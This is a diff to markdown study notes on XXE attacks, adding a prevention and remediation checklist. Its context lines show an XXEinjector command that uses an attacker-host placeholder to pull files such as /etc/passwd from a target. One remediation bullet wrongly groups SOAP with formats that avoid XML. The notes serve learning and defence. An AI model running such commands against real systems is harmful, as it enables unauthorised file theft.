@@ -181,3 +181,15 @@ ruby XXEinjector.rb --host=[ATK_HOST] --httpport=8000 --file=/tmp/xxe.req --path
 We can then find the file under `Logs/[IP]/path_to_file.log` (eg. `Logs/10.129.201.94/etc/passwd.log`)
 
 ### Prevention & Remediation
+- As the XML parser is usually a dependency the easiest way to resolve XXE vulnerabilities is often to update the dependency and ensure you are using the latest security patches.
+- Don't use outdated XML functions that have been deprecated ([OWASP's XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php))
+- Update any libraries or components that might take XML input or parse it in some way as this could also introduce XXE vulnerabilities.
+- Using safe XML configurations in the web app
+	- Disable referencing custom *DTDs*
+	- Disable referencing *External XML Entities*
+	- Disable *Parameter Entity* processing
+	- Disable support for *XInclude*
+	- Prevent *Entity Reference Loops*
+- Ensure user output is appropriately sanitised (eg. no runtime errors, avoid reflections)
+- Use other formats than XML where possible (eg. JSON or YAML) / Use API standards that don't rely on XML (eg. SOAP) like JSON for REST.
+- Use a WAF
